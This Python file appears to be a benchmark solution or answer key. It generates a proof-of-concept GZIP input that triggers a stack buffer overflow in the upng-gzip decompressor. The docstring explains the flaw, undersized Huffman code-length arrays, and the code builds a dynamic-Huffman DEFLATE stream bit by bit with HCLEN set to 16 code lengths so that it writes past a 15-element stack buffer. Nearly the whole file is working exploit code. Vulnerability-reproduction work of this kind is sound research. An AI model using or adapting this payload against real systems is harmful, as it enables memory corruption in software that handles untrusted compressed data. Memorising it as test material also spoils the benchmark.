import io

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Stack Buffer Overflow
    vulnerability in upng-gzip.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability exists in the Huffman decoding part of upng-gzip.
        Temporary arrays used for building Huffman trees are sized to 15, but
        the DEFLATE specification allows for up to 19 symbols in the code
        length alphabet. By crafting a DEFLATE stream that defines a dynamic
        Huffman table with more than 15 code length symbols, we can cause an
        out-of-bounds write on the stack.

        The PoC is a GZIP-formatted file containing a malicious DEFLATE stream.

        Structure of the PoC:
        1. GZIP Header (10 bytes): Standard header for a .gz file.
        2. Malicious DEFLATE Stream (9 bytes):
           - A single block marked as the final block (BFINAL=1).
           - Block type is dynamic Huffman codes (BTYPE=2).
           - The dynamic Huffman header specifies HCLEN=12. This means the
             decoder must read HCLEN + 4 = 16 code lengths for the code length
             alphabet.
           - This value (16) is greater than the buffer size (15), causing a
             one-element stack buffer overflow when the decoder builds the
             Huffman tree for the code length alphabet.
           - We provide 16 valid code lengths (all set to 4) to ensure the
             stream is parsable up to the point of the vulnerability.
        3. GZIP Trailer (8 bytes): Standard GZIP trailer with CRC32 and ISIZE
           for the (empty) uncompressed data.

        Total length: 10 (header) + 9 (stream) + 8 (trailer) = 27 bytes.
        """
        # 1. GZIP Header (10 bytes)
        gzip_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'

        # 2. Malicious DEFLATE Stream (9 bytes)
        # We construct the stream bit by bit, writing LSB first.
        bitstream_val = 0
        bit_count = 0

        def write_bits(value: int, num_bits: int):
            nonlocal bitstream_val, bit_count
            bitstream_val |= (value << bit_count)
            bit_count += num_bits

        # DEFLATE Block Header (3 bits)
        write_bits(1, 1)  # BFINAL = 1 (final block)
        write_bits(2, 2)  # BTYPE = 2 (dynamic Huffman)

        # Dynamic Huffman Table Header (14 bits)
        write_bits(0, 5)  # HLIT = 0 (257 literal/length codes)
        write_bits(0, 5)  # HDIST = 0 (1 distance code)
        write_bits(12, 4) # HCLEN = 12 (16 code length codes -> overflows buffer of 15)

        # Code Lengths for the Code Length Alphabet (16 * 3 = 48 bits)
        # We provide 16 code lengths, each with value 4. This is a valid set,
        # as 16 * (2^-4) = 1, satisfying Kraft's inequality.
        for _ in range(16):
            write_bits(4, 3)

        # Convert the bitstream integer to a byte string (LSB first).
        # Total bits = 3 + 14 + 48 = 65 bits.
        num_bytes = (bit_count + 7) // 8  # ceil(65/8) = 9 bytes
        deflate_stream = bitstream_val.to_bytes(num_bytes, byteorder='little')

        # 3. GZIP Trailer (8 bytes)
        # CRC32 and ISIZE of empty uncompressed data are both 0.
        gzip_trailer = b'\x00\x00\x00\x00\x00\x00\x00\x00'

        # Assemble the final PoC
        poc = gzip_header + deflate_stream + gzip_trailer
        return poc